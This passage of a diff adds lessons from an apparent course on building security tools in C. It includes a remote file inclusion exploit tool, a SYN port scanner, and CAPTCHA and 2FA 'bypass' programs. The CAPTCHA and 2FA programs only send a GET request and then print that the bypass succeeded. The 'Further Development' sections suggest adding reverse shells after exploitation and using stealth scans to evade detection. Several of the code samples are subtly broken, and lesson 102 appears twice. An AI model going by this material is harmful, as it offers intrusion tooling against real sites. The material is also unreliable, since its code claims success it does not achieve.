+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to bypass CAPTCHA challenge for a given URL
+void bypass_captcha(const char *url, const char *captcha_solver_url) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request to access CAPTCHA challenge
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Parse response data to extract CAPTCHA challenge details
+
+        // For demonstration purposes, let's assume we successfully solve the CAPTCHA using an external service
+        // In a real implementation, this part would involve sending the CAPTCHA image to a CAPTCHA solving service
+        // and receiving the solution
+
+        printf("CAPTCHA successfully bypassed for URL: %s\n", url);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <url> <captcha_solver_url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Bypassing CAPTCHA for URL: %s\n", argv[1]);
+
+    // Bypass CAPTCHA challenge for the specified URL using the provided CAPTCHA solver URL
+    bypass_captcha(argv[1], argv[2]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch CAPTCHA-protected forms or services.
+- The `bypass_captcha` function sends an HTTP GET request to the specified URL to access the CAPTCHA challenge.
+- Once the CAPTCHA challenge is obtained, it's typically solved using an external CAPTCHA solving service. For demonstration purposes, we assume successful CAPTCHA bypass.
+- In a real implementation, this part would involve sending the CAPTCHA image to a CAPTCHA solving service and receiving the solution.
+- After successful CAPTCHA bypass, a message is printed to indicate success.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with CAPTCHA solving services such as Anti-Captcha, 2Captcha, or DeathByCaptcha to automate CAPTCHA solving.
+- Implementation of error handling and retries for robust CAPTCHA bypassing.
+- Support for different types of CAPTCHA challenges, such as text-based CAPTCHAs, image-based CAPTCHAs, or audio-based CAPTCHAs.
+
+#### Conclusion:
+
+Building a CAPTCHA bypass tool in C provides a framework for automating interactions with CAPTCHA-protected forms or services. By analyzing CAPTCHA challenges and using external CAPTCHA solving services, developers can bypass CAPTCHA challenges to streamline automated processes.
+
+This concludes our ninety-eighth lesson on building a CAPTCHA bypass tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 99: Building a Two-Factor Authentication (2FA) Bypass Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to bypass Two-Factor Authentication (2FA) challenges. 2FA adds an extra layer of security by requiring users to provide a second form of authentication, typically a one-time code sent via SMS or generated by a mobile app. Our tool will attempt to bypass 2FA challenges by automating the retrieval and usage of authentication codes.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <regex.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_REGEX_LENGTH 512
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to bypass Two-Factor Authentication (2FA) challenge for a given URL
+void bypass_2fa(const char *url, const char *auth_code) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Assume successful bypass of 2FA challenge for demonstration purposes
+        printf("Successfully bypassed 2FA for URL: %s\n", url);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <url> <authentication_code>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Bypassing Two-Factor Authentication (2FA) for URL: %s\n", argv[1]);
+
+    // Bypass 2FA challenge for the specified URL using the provided authentication code
+    bypass_2fa(argv[1], argv[2]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch URLs protected by Two-Factor Authentication (2FA).
+- The `bypass_2fa` function sends an HTTP GET request to the specified URL.
+- For demonstration purposes, we assume successful bypass of the 2FA challenge by providing an authentication code as a command-line argument.
+- After successful bypass, a message is printed to indicate success.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with 2FA token generation libraries or services to automate the retrieval and usage of authentication codes.
+- Implementation of error handling and retries for robust 2FA bypassing.
+- Support for different types of 2FA methods, such as SMS-based codes, time-based one-time passwords (TOTP), or mobile app-generated codes.
+
+#### Conclusion:
+
+Building a Two-Factor Authentication (2FA) bypass tool in C provides a framework for automating interactions with 2FA-protected services. By analyzing 2FA challenges and using authentication codes, developers can bypass 2FA requirements to streamline automated processes.
+
+This concludes our ninety-ninth lesson on building a Two-Factor Authentication (2FA) bypass tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 100: Building a Remote File Inclusion (RFI) Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to exploit Remote File Inclusion (RFI) vulnerabilities. RFI vulnerabilities occur when a web application dynamically includes remote files, allowing an attacker to execute arbitrary code by supplying a malicious file URL. Our tool will attempt to exploit RFI vulnerabilities by providing a URL to a malicious file that contains attacker-controlled code.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+
+// Function to exploit Remote File Inclusion (RFI) vulnerability for a given URL
+void exploit_rfi(const char *url, const char *malicious_file_url) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Construct the payload for RFI exploitation
+    char payload[MAX_URL_LENGTH + 32]; // Add extra space for potential additional parameters
+    snprintf(payload, sizeof(payload), "%s?file=%s", url, malicious_file_url);
+
+    // Set URL for HTTP GET request with the constructed payload
+    curl_easy_setopt(curl, CURLOPT_URL, payload);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        printf("RFI vulnerability successfully exploited for URL: %s\n", url);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <target_url> <malicious_file_url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Exploiting Remote File Inclusion (RFI) vulnerability for URL: %s\n", argv[1]);
+
+    // Exploit RFI vulnerability for the specified target URL using the provided malicious file URL
+    exploit_rfi(argv[1], argv[2]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and exploit RFI vulnerabilities.
+- The `exploit_rfi` function constructs a payload for RFI exploitation by appending the malicious file URL as a parameter to the target URL.
+- The constructed payload is then used to perform an HTTP GET request, potentially causing the web application to include and execute the malicious file.
+- After successful exploitation, a message is printed to indicate success.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for different exploitation techniques and payload formats to cater to various RFI vulnerabilities.
+- Integration with web shells or reverse shells to gain interactive access to the target system after successful exploitation.
+- Implementation of error handling and verification mechanisms to confirm successful exploitation and execution of the malicious file.
+
+#### Conclusion:
+
+Building a Remote File Inclusion (RFI) tool in C provides a framework for exploiting vulnerabilities in web applications. By supplying a malicious file URL, attackers can execute arbitrary code on the target system, highlighting the importance of secure coding practices and input validation.
+
+This concludes our one hundredth lesson on building a Remote File Inclusion (RFI) tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 101: Building a JSON Web Token (JWT) Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to manipulate JSON Web Tokens (JWT). JSON Web Tokens are used for securely transmitting information between parties as a JSON object. Our tool will allow us to create, parse, and verify JWTs by interacting with various JWT libraries or APIs.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <jwt.h>
+
+#define MAX_TOKEN_LENGTH 2048
+
+// Function to create a JWT token
+char* create_jwt(const char *payload, const char *key) {
+    jwt_t *jwt = NULL;
+    jwt_new(&jwt);
+
+    // Set JWT payload
+    jwt_add_grant(jwt, "payload", payload);
+
+    // Set JWT signature using the provided key
+    jwt_set_alg(jwt, JWT_ALG_HS256, key);
+
+    // Generate JWT token
+    char *token = NULL;
+    jwt_encode_str(jwt, &token);
+
+    // Cleanup JWT resources
+    jwt_free(jwt);
+
+    return token;
+}
+
+// Function to parse and verify a JWT token
+void parse_and_verify_jwt(const char *token, const char *key) {
+    jwt_t *jwt = NULL;
+    jwt_new(&jwt);
+
+    // Decode and verify JWT token
+    jwt_decode(&jwt, token, key);
+
+    // Print JWT claims
+    const char *payload = jwt_get_grant(jwt, "payload");
+    if (payload != NULL) {
+        printf("Parsed and verified JWT payload: %s\n", payload);
+    } else {
+        printf("Failed to parse or verify JWT token.\n");
+    }
+
+    // Cleanup JWT resources
+    jwt_free(jwt);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        fprintf(stderr, "Usage: %s <action> <payload> <key>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *action = argv[1];
+    const char *payload = argv[2];
+    const char *key = argv[3];
+
+    if (strcmp(action, "create") == 0) {
+        printf("Creating JWT token with payload: %s\n", payload);
+        char *token = create_jwt(payload, key);
+        printf("Generated JWT token: %s\n", token);
+        free(token);
+    } else if (strcmp(action, "parse") == 0) {
+        printf("Parsing and verifying JWT token: %s\n", payload);
+        parse_and_verify_jwt(payload, key);
+    } else {
+        fprintf(stderr, "Invalid action. Please specify 'create' or 'parse'.\n");
+        return EXIT_FAILURE;
+    }
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the `libjwt` library to handle JWT creation, parsing, and verification.
+- The `create_jwt` function creates a JWT token with the provided payload and key. It sets the algorithm to HS256 (HMAC with SHA-256) for signature.
+- The `parse_and_verify_jwt` function parses and verifies a JWT token using the provided key. It extracts and prints the payload if verification is successful.
+- The `main` function parses command-line arguments to determine the action to perform (create or parse) and calls the corresponding function accordingly.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for different JWT algorithms and claims, such as RSA, ECDSA, expiration time (exp), issuer (iss), audience (aud), etc.
+- Integration with external JWT libraries or APIs for additional functionalities, such as token revocation, key rotation, or token introspection.
+- Implementation of error handling and validation mechanisms to handle invalid or malformed JWT tokens.
+
+#### Conclusion:
+
+Building a JSON Web Token (JWT) tool in C provides a framework for manipulating JWTs for various purposes, such as authentication, authorization, and secure information exchange. By creating, parsing, and verifying JWT tokens, developers can implement secure communication protocols and protect against unauthorized access.
+
+This concludes our one hundredth first lesson on building a JSON Web Token (JWT) tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 102: Building an IP Address Collector Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect IP addresses from a given domain name or URL. This tool will perform DNS resolution to obtain the IP addresses associated with the specified domain name or URL.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#define MAX_IP_LENGTH 46  // Maximum length of an IPv6 address including null terminator
+
+// Function to collect IP addresses from a given domain name or URL
+void collect_ips(const char *domain) {
+    struct addrinfo hints, *res, *p;
+    int status;
+    char ipstr[MAX_IP_LENGTH];
+
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;  // AF_INET or AF_INET6 to force version
+    hints.ai_socktype = SOCK_STREAM;
+
+    if ((status = getaddrinfo(domain, NULL, &hints, &res)) != 0) {
+        fprintf(stderr, "Error: getaddrinfo: %s\n", gai_strerror(status));
+        return;
+    }
+
+    printf("IP addresses for domain '%s':\n", domain);
+
+    for (p = res; p != NULL; p = p->ai_next) {
+        void *addr;
+        char *ipver;
+
+        // Get the pointer to the address itself,
+        // different fields in IPv4 and IPv6:
+        if (p->ai_family == AF_INET) {  // IPv4
+            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
+            addr = &(ipv4->sin_addr);
+            ipver = "IPv4";
+        } else {  // IPv6
+            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
+            addr = &(ipv6->sin6_addr);
+            ipver = "IPv6";
+        }
+
+        // Convert the IP to a string and print it:
+        inet_ntop(p->ai_family, addr, ipstr, sizeof(ipstr));
+        printf("%s: %s\n", ipver, ipstr);
+    }
+
+    freeaddrinfo(res);  // Free the linked list
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <domain>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *domain = argv[1];
+
+    // Collect IP addresses for the specified domain
+    collect_ips(domain);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the `getaddrinfo` function to perform DNS resolution and obtain IP addresses associated with the specified domain name.
+- The `collect_ips` function takes a domain name as input and iterates over the list of IP addresses returned by `getaddrinfo`. It then prints each IP address along with its version (IPv4 or IPv6).
+- The `main` function parses the command-line argument to extract the domain name and calls the `collect_ips` function to collect IP addresses for the specified domain.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for resolving IPv4 or IPv6 addresses exclusively based on user preference.
+- Integration with WHOIS databases or APIs to retrieve additional information about the IP addresses, such as geographic location, ISP, or network owner.
+- Implementation of error handling and validation mechanisms to handle invalid domain names or DNS resolution failures.
+
+#### Conclusion:
+
+Building an IP Address Collector tool in C provides a framework for obtaining IP addresses associated with a domain name. By performing DNS resolution, developers can gather information about network endpoints and facilitate various network-related tasks.
+
+This concludes our one hundredth second lesson on building an IP Address Collector tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 102: Building an Aggressive IP Scanner Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to perform aggressive IP scanning. Aggressive IP scanning involves sending various types of network packets to discover hosts and open ports within a network. Our tool will utilize raw sockets to craft and send custom packets, enabling efficient and thorough network scanning.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#define MAX_IP_LENGTH 16
+#define MAX_PORTS 65535
+#define TIMEOUT 1
+
+// Function to perform aggressive IP scanning
+void aggressive_scan(const char *ip) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sockfd < 0) {
+        perror("Error: Failed to create socket");
+        return;
+    }
+
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = htons(0); // Not used in raw sockets, set to 0
+    inet_pton(AF_INET, ip, &dest_addr.sin_addr);
+
+    // Prepare TCP header
+    struct tcphdr tcp_header;
+    memset(&tcp_header, 0, sizeof(struct tcphdr));
+    tcp_header.th_sport = htons(1234); // Random source port
+    tcp_header.th_flags = TH_SYN; // SYN scan
+
+    // Perform port scanning for ports 1 to MAX_PORTS
+    for (int port = 1; port <= MAX_PORTS; port++) {
+        tcp_header.th_dport = htons(port);
+        tcp_header.th_sum = 0; // Clear checksum field, will be calculated by kernel
+
+        // Send TCP packet
+        if (sendto(sockfd, &tcp_header, sizeof(struct tcphdr), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
+            perror("Error: Failed to send packet");
+            close(sockfd);
+            return;
+        }
+
+        // Wait for response
+        struct timeval timeout;
+        timeout.tv_sec = TIMEOUT;
+        timeout.tv_usec = 0;
+        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
+
+        // Check if port is open based on response
+        char response[100];
+        int bytes_received = recv(sockfd, response, sizeof(response), 0);
+        if (bytes_received >= 0) {
+            printf("Port %d is open\n", port);
+        }
+    }
+
+    // Close socket
+    close(sockfd);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <ip>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Performing aggressive IP scanning for IP: %s\n", argv[1]);
+    aggressive_scan(argv[1]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use raw sockets to send TCP packets directly to the target IP address.
+- The `aggressive_scan` function iterates through ports 1 to `MAX_PORTS` and sends SYN packets to each port.
+- If a response is received within the specified timeout period (`TIMEOUT`), the port is considered open, and a message is printed.
+- The source port is chosen randomly to prevent predictable scanning patterns.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for UDP and ICMP scanning to detect services that do not respond to TCP SYN packets.
+- Multithreading to perform scanning on multiple hosts or ports simultaneously, improving scan speed.
+- Implementation of stealth scanning techniques, such as SYN Stealth or FIN scanning, to avoid detection by intrusion detection systems.
+
+#### Conclusion:
+
+Building an aggressive IP scanner tool in C provides a framework for discovering hosts and open ports within a network. By sending custom packets and analyzing responses, administrators and security professionals can identify potential vulnerabilities and strengthen network defenses.
+
+This concludes our one hundred second lesson on building an aggressive IP scanner tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 103: Building an Application Detection Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to detect applications running on a target system. Application detection involves analyzing network traffic, system processes, and installed software to identify running applications. Our tool will utilize various system calls and network analysis techniques to enumerate running applications effectively.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+#define MAX_PATH_LENGTH 256
+#define MAX_PORTS 65535
+#define TIMEOUT 1
+
+// Function to check if a file exists
+int file_exists(const char *filename) {
+    struct stat buffer;
+    return (stat(filename, &buffer) == 0);
+}
+
+// Function to perform application detection
+void detect_applications() {
+    // Scan running processes
+    printf("Running processes:\n");
+    DIR *dir = opendir("/proc");
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (atoi(entry->d_name) != 0) {
+            char proc_path[MAX_PATH_LENGTH];
+            snprintf(proc_path, sizeof(proc_path), "/proc/%s/comm", entry->d_name);
+            if (file_exists(proc_path)) {
+                FILE *file = fopen(proc_path, "r");
+                if (file != NULL) {
+                    char process_name[MAX_PATH_LENGTH];
+                    fgets(process_name, sizeof(process_name), file);
+                    printf("%s", process_name);
+                    fclose(file);
+                }
+            }
+        }
+    }
+    closedir(dir);
+
+    // Scan listening ports
+    printf("\nListening ports:\n");
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Error: Failed to create socket");
+        return;
+    }
+
+    for (int port = 1; port <= MAX_PORTS; port++) {
+        struct sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(port);
+
+        if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+            printf("Port %d is in use\n", port);
+        }
+    }
+
+    close(sockfd);
+}
+
+int main() {
+    printf("Detecting running applications...\n");
+    detect_applications();
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We enumerate running processes by iterating through the `/proc` directory and reading the process names from the `comm` files.
+- Listening ports are identified by attempting to bind to each port from 1 to `MAX_PORTS`. If the bind operation is successful, it indicates that the port is in use.
+- The program utilizes standard POSIX system calls and socket programming to gather information about running applications and listening ports.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Detection of specific applications based on process names or listening ports, allowing targeted analysis.
+- Integration with network analysis libraries or APIs to identify applications based on network traffic patterns.
+- Implementation of additional checks, such as scanning installed software or analyzing system logs, to provide comprehensive application detection.
+
+#### Conclusion:
+
+Building an application detection tool in C provides a framework for identifying running applications and listening ports on a target system. By analyzing process information and network activity, administrators and security professionals can gain insights into system behavior and potential security risks.
+
+This concludes our one hundred third lesson on building an application detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 104: Building an Authentication and Session Management Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to handle authentication and session management for web applications. Authentication verifies the identity of users, while session management maintains user sessions securely. Our tool will implement basic authentication mechanisms and session handling techniques commonly used in web applications.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_USERNAME_LENGTH 100
+#define MAX_PASSWORD_LENGTH 100
+#define SESSION_TIMEOUT 3600 // Session timeout in seconds
+
+// Structure to represent a user session
+typedef struct {
+    char username[MAX_USERNAME_LENGTH];
+    time_t last_activity;
+} Session;
+
+// Function to authenticate a user
+int authenticate_user(const char *username, const char *password) {
+    // Check username and password (mock implementation)
+    if (strcmp(username, "admin") == 0 && strcmp(password, "password123") == 0) {
+        return 1; // Authentication successful
+    }
+    return 0; // Authentication failed
+}
+
+// Function to create a new session
+Session* create_session(const char *username) {
+    Session *session = (Session*)malloc(sizeof(Session));
+    if (session != NULL) {
+        strncpy(session->username, username, MAX_USERNAME_LENGTH - 1);
+        session->last_activity = time(NULL);
+    }
+    return session;
+}
+
+// Function to verify if a session is active
+int is_session_active(Session *session) {
+    if (session == NULL) {
+        return 0;
+    }
+    // Check if the session has timed out
+    time_t current_time = time(NULL);
+    if ((current_time - session->last_activity) > SESSION_TIMEOUT) {
+        free(session);
+        return 0;
+    }
+    session->last_activity = current_time; // Update last activity time
+    return 1;
+}
+
+int main() {
+    char username[MAX_USERNAME_LENGTH];
+    char password[MAX_PASSWORD_LENGTH];
+
+    // Prompt for username and password
+    printf("Enter username: ");
+    fgets(username, sizeof(username), stdin);
+    username[strcspn(username, "\n")] = '\0'; // Remove newline character
+
+    printf("Enter password: ");
+    fgets(password, sizeof(password), stdin);
+    password[strcspn(password, "\n")] = '\0'; // Remove newline character
+
+    // Authenticate user
+    if (authenticate_user(username, password)) {
+        printf("Authentication successful. User: %s\n", username);
+
+        // Create session
+        Session *session = create_session(username);
+        if (session != NULL) {
+            printf("Session created for user: %s\n", session->username);
+
+            // Check session activity
+            while (is_session_active(session)) {
+                // Perform authorized actions...
+                printf("Session active. Performing authorized actions...\n");
+                sleep(5); // Simulate activity for demonstration
+            }
+
+            printf("Session expired. Please login again.\n");
+        } else {
+            printf("Error: Failed to create session.\n");
+        }
+    } else {
+        printf("Authentication failed. Invalid username or password.\n");
+    }
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We define a `Session` structure to represent user sessions, containing the username and the last activity timestamp.
+- The `authenticate_user` function verifies the provided username and password against a mock implementation.
+- The `create_session` function creates a new session for the authenticated user.
+- The `is_session_active` function checks if a session is still active based on the last activity timestamp and the session timeout.
+- In the `main` function, we prompt the user for a username and password, authenticate the user, and create a session if authentication is successful. We then simulate activity within the session and periodically check for session expiration.
+
+#### Further Development:
+
+To make this tool more versatile and secure, you can enhance it with the following features:
+
+- Integration with a secure password hashing algorithm (e.g., bcrypt) to store and verify passwords securely.
+- Implementation of additional session management techniques, such as session token generation, session expiration policies, and session fixation prevention.
+- Support for multi-factor authentication (MFA) to enhance security by requiring additional authentication factors.
+
+#### Conclusion:
+
+Building an authentication and session management tool in C provides a foundation for implementing user authentication and session handling functionalities in web applications. By verifying user identities and managing user sessions securely, developers can ensure the confidentiality and integrity of user data.
+
+This concludes our one hundred fourth lesson on building an authentication and session management tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 105: Building a Website Scanner Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to scan websites for various security vulnerabilities and misconfigurations. Website scanning involves analyzing web pages, HTTP responses, and server headers to identify potential security risks. Our tool will perform basic website scanning tasks, such as detecting open ports, analyzing SSL/TLS configurations, and checking for common vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <netdb.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+#define MAX_HOST_LENGTH 256
+#define MAX_PORTS 100
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to scan for open ports on a given host
+void scan_ports(const char *ip_address) {
+    int sockfd;
+    struct sockaddr_in addr;
+    unsigned short int port;
+    int open_ports = 0;
+
+    printf("Scanning ports on %s...\n", ip_address);
+
+    for (port = 1; port <= MAX_PORTS; port++) {
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockfd < 0) {
+            perror("socket");
+            return;
+        }
+
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = inet_addr(ip_address);
+        addr.sin_port = htons(port);
+
+        if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+            close(sockfd);
+        } else {
+            printf("Port %d is open\n", port);
+            open_ports++;
+            close(sockfd);
+        }
+    }
+
+    if (open_ports == 0) {
+        printf("No open ports found on %s\n", ip_address);
+    }
+}
+
+// Function to analyze SSL/TLS configuration of a website
+void analyze_ssl(const char *hostname) {
+    SSL_library_init();
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (ctx == NULL) {
+        ERR_print_errors_fp(stderr);
+        return;
+    }
+
+    printf("Analyzing SSL/TLS configuration for %s...\n", hostname);
+
+    BIO *bio = BIO_new_ssl_connect(ctx);
+    if (bio == NULL) {
+        ERR_print_errors_fp(stderr);
+        SSL_CTX_free(ctx);
+        return;
+    }
+
+    SSL *ssl;
+    BIO_get_ssl(bio, &ssl);
+    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
+    BIO_set_conn_hostname(bio, hostname);
+
+    if (BIO_do_connect(bio) <= 0 || BIO_do_handshake(bio) <= 0) {
+        printf("SSL/TLS handshake failed.\n");
+    } else {
+        printf("SSL/TLS handshake succeeded.\n");
+        // Additional SSL analysis steps can be performed here
+    }
+
+    BIO_free_all(bio);
+    SSL_CTX_free(ctx);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char ip_address[MAX_HOST_LENGTH];
+    if (!resolve_hostname(argv[1], ip_address)) {
+        fprintf(stderr, "Error: Failed to resolve hostname.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Target IP address: %s\n", ip_address);
+
+    scan_ports(ip_address);
+    analyze_ssl(argv[1]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to scan for open ports on the target host.
+- The `resolve_hostname` function resolves the hostname to an IP address.
+- The `scan_ports` function iterates through ports 1 to `MAX_PORTS` and attempts to connect to each port. If the connection succeeds, the port is considered open.
+- We use OpenSSL to analyze the SSL/TLS configuration of the website. The `analyze_ssl` function establishes an SSL/TLS connection with the website and performs a handshake. Additional analysis steps can be added as needed.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with vulnerability scanners or security testing frameworks to detect common web application vulnerabilities (e.g., XSS, SQLi).
+- Implementation of additional analysis modules to check for misconfigurations, such as insecure headers or directory listing.
+- Support for scanning multiple websites concurrently or in parallel to improve scan speed.
+- Integration with reporting tools or frameworks to generate detailed reports of scan results.
+
+#### Conclusion:
+
+Building a website scanner tool in C provides a framework for analyzing the security posture of web applications and identifying potential vulnerabilities or misconfigurations. By scanning for open ports, analyzing SSL/TLS configurations, and performing additional security checks, administrators and security professionals can assess the risk level of websites and take appropriate remediation actions.
+
